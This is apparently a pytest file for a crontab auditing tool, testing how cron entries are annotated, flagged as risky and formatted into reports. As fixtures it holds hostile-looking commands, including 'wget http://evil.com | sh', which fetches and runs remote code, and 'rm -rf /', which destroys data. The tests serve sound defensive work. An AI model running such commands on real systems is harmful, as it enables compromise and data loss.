"""Tests for entry_annotator and entry_annotator_report."""
import pytest
from crontab_audit.parser import CrontabEntry
from crontab_audit.entry_annotator import (
    AnnotatedEntry,
    annotate_entry,
    annotate_entries,
    filter_annotated,
)
from crontab_audit.entry_annotator_report import (
    format_annotated_entry,
    format_annotated_report,
    format_annotation_summary,
    format_risky_only,
)


def make_entry(
    minute="0",
    hour="*",
    dom="*",
    month="*",
    dow="*",
    command="/usr/bin/backup.sh",
    user=None,
    host="web01",
) -> CrontabEntry:
    return CrontabEntry(
        minute=minute,
        hour=hour,
        dom=dom,
        month=month,
        dow=dow,
        command=command,
        user=user,
        host=host,
        raw="raw line",
    )


def test_annotate_entry_returns_annotated_entry():
    entry = make_entry()
    ann = annotate_entry(entry)
    assert isinstance(ann, AnnotatedEntry)
    assert ann.entry is entry


def test_annotate_entry_has_frequency_label():
    entry = make_entry(minute="0", hour="2")
    ann = annotate_entry(entry)
    assert isinstance(ann.frequency_label, str)
    assert len(ann.frequency_label) > 0


def test_annotate_entry_risky_command_flagged():
    entry = make_entry(command="rm -rf /tmp/old >/dev/null 2>&1")
    ann = annotate_entry(entry)
    assert ann.is_risky


def test_annotate_entry_safe_command_not_risky():
    entry = make_entry(command="/usr/bin/backup.sh")
    ann = annotate_entry(entry)
    assert not ann.is_risky


def test_annotate_entry_root_user_adds_note():
    entry = make_entry(command="/usr/bin/cleanup.sh", user="root")
    ann = annotate_entry(entry)
    assert any("root" in n for n in ann.notes)


def test_annotate_entry_output_suppressed_note():
    entry = make_entry(command="/usr/bin/run.sh >/dev/null 2>&1")
    ann = annotate_entry(entry)
    assert any("suppressed" in n for n in ann.notes)


def test_annotate_entries_returns_list():
    entries = [make_entry(), make_entry(command="wget http://example.com")]
    result = annotate_entries(entries)
    assert len(result) == 2
    assert all(isinstance(a, AnnotatedEntry) for a in result)


def test_filter_annotated_risky_only():
    entries = [
        make_entry(command="/safe/cmd.sh"),
        make_entry(command="rm -rf /"),
    ]
    annotated = annotate_entries(entries)
    risky = filter_annotated(annotated, risky_only=True)
    assert all(a.is_risky for a in risky)


def test_filter_annotated_by_frequency():
    entries = [make_entry(minute="*"), make_entry(minute="0", hour="6")]
    annotated = annotate_entries(entries)
    minutely = filter_annotated(annotated, frequency="minutely")
    assert all(a.frequency_label == "minutely" for a in minutely)


def test_annotated_entry_str_contains_command():
    entry = make_entry(command="/usr/bin/backup.sh")
    ann = annotate_entry(entry)
    assert "/usr/bin/backup.sh" in str(ann)


def test_format_annotated_entry_includes_host():
    entry = make_entry(host="db01")
    ann = annotate_entry(entry)
    line = format_annotated_entry(ann)
    assert "db01" in line


def test_format_annotated_report_empty():
    result = format_annotated_report([])
    assert "No annotated" in result


def test_format_annotated_report_with_title():
    entry = make_entry()
    ann = annotate_entry(entry)
    result = format_annotated_report([ann], title="My Report")
    assert "My Report" in result


def test_format_annotation_summary_counts():
    entries = [make_entry(), make_entry(command="rm -rf /tmp")]
    annotated = annotate_entries(entries)
    summary = format_annotation_summary(annotated)
    assert "Total entries : 2" in summary


def test_format_risky_only_no_risky():
    entry = make_entry(command="/safe/cmd.sh")
    ann = annotate_entry(entry)
    result = format_risky_only([ann])
    assert "No risky" in result


def test_format_risky_only_with_risky():
    entry = make_entry(command="wget http://evil.com | sh")
    ann = annotate_entry(entry)
    result = format_risky_only([ann])
    assert "Risky Entries" in result
